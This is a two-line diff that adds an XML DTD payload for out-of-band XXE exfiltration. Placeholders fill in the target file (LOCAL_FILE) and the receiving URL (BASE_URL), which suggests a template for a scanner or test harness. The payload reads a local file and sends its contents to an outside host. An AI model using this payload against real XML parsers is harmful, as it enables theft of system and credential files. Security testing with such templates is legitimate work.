@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "LOCAL_FILE">
+<!ENTITY % all "<!ENTITY send SYSTEM 'BASE_URL/%file;'>">
